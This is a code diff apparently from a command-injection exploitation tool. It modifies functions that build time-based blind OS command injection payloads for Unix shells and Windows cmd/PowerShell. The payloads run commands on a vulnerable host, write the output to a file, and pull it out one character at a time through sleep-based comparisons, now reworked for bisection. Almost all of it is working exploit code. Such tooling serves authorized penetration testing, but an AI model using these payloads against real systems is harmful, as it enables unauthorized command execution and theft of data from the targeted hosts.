@@ -77,11 +77,11 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
       separator = _urllib.parse.unquote(separator)
     elif separator == "||" :
       pipe = "|"
+      # Keep the leading pipe and "||" syntax; run the length check pipe-free in a subshell.
       payload = (pipe +
                 "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe +
-                "[ " + str(j) + " -ne " + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE +
-                pipe + "tr -d '" + settings.END_LINE.ESCAPED_LF + "'" +
-                pipe + "wc -c) ] " + separator +
+                "[ " + str(j) + " -ne $(" + settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + ";" +
+                "echo ${#" + settings.RANDOM_VAR_GENERATOR + "}) ] " + separator +
                 "sleep " + str(timesec)
                 )
     else:
@@ -162,7 +162,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
 """
 Execute shell commands on vulnerable host.
 """
-def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
+def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method, operator="-le"):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator in ("|", "||"):
       pipe = "|"
@@ -204,12 +204,15 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
     if separator in (";", "%0a") :
       payload = (separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr '" + settings.END_LINE.ESCAPED_LF + "' ' ' < " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "echo $" + settings.RANDOM_VAR_GENERATOR + " > " + OUTPUT_TEXTFILE + separator +
+                # Quoted - an unquoted "$VAR" here word-splits on internal whitespace,
+                # collapsing runs of spaces/tabs in the command's real output.
+                "echo \"$" + settings.RANDOM_VAR_GENERATOR + "\" > " + OUTPUT_TEXTFILE + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 #settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
-                "if [ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
+                # Use -le for bisection; rewrite the payload each time to keep repeated matches harmless.
+                "if [ " + str(j) + " " + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
                 # "then sleep 0 " + separator +
                 "then sleep " + str(timesec) + separator +
                 # Transform to ASCII
@@ -223,12 +226,13 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       payload = (ampersand +
                 "sleep 0 " + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr -d '" + settings.END_LINE.ESCAPED_LF + "' <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "echo $" + settings.RANDOM_VAR_GENERATOR + "" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
+                "echo \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
                 #settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
-                "[ " + str(j) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
+                # -le (not -eq) makes this bisectable like time-based's length check.
+                "[ " + str(j) + " " + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
                 "sleep " + str(timesec) + separator +
                 # Transform to ASCII
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1<" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
@@ -241,8 +245,8 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       cmd = checks.add_command_substitution(cmd)
       payload = (pipe +
                 cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe +
-                "[ " + str(j) + " -ne " + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + pipe +
-                "tr -d '" + settings.END_LINE.ESCAPED_LF + "'" + pipe + "wc -c) ]" + separator +
+                "[ " + str(j) + " -ne $(" + settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + ";" +
+                "echo ${#" + settings.RANDOM_VAR_GENERATOR + "}) ]" + separator +
                 "sleep " + str(timesec)
                 )
     else:
@@ -326,14 +330,16 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
 """
 Get the execution output, of shell execution.
 """
-def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
+def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method, operator="-le"):
+  # Use bisection by default; validation re-probes the resolved value with equality.
+  win_operator = "GEQ" if operator == "-le" else "EQU"
   if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator in ("|", "||"):
       pipe = "|"
       payload = (pipe +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" + str(num_of_chars - 1) + "]\"')" + settings.SINGLE_WHITESPACE +
-                "do if %i GEQ " + str(ascii_char) + settings.SINGLE_WHITESPACE +
+                "do if %i " + win_operator + settings.SINGLE_WHITESPACE + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
     elif separator == _urllib.parse.quote("&&") :
@@ -342,7 +348,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
       payload = (ampersand +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" + str(num_of_chars - 1) + "]\"')" + settings.SINGLE_WHITESPACE +
-                "do if %i GEQ " + str(ascii_char) + settings.SINGLE_WHITESPACE +
+                "do if %i " + win_operator + settings.SINGLE_WHITESPACE + str(ascii_char) + settings.SINGLE_WHITESPACE +
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
     else:
@@ -352,7 +358,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
       payload = (separator +
                 # Use space as delimiter
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cut -d ' ' -f " + str(num_of_chars) + " < " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "if [ " + str(ascii_char) + " -le ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
+                "if [ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
                 # "then sleep 0" + separator +
                 "then sleep " + str(timesec) + separator +
                 "fi"
@@ -364,19 +370,19 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
                 "sleep 0" + separator +
                 # Use space as delimiter
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "awk '{print$" + str(num_of_chars) + "}'<" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
-                "[ " + str(ascii_char) + " -le ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
+                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                 "sleep " + str(timesec)
                 )
       separator = _urllib.parse.unquote(separator)
     elif separator == "||" :
       pipe = "|"
+      # Keep the leading pipe syntax; run extraction pipe-free in a self-contained subshell.
+      qmarks = "?" * (num_of_chars - 1)
       payload = (pipe +
-                "[ " + str(ascii_char) + " -gt " + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE +
-                pipe + "tr -d '" + settings.END_LINE.ESCAPED_LF + "'" +
-                pipe + "cut -c " + str(num_of_chars) +
-                pipe + "od -N 1 -i" +
-                pipe + "head -1" +
-                pipe + "awk '{print$2}') ] " + separator +
+                "[ " + str(ascii_char) + " -gt $(" + settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + ";" +
+                settings.RANDOM_VAR_GENERATOR + "=${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "};" +
+                settings.RANDOM_VAR_GENERATOR + "=${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"};" +
+                "printf '%d' \"'${" + settings.RANDOM_VAR_GENERATOR + "}\") ] " + separator +
                 "sleep " + str(timesec)
                 )
     else:
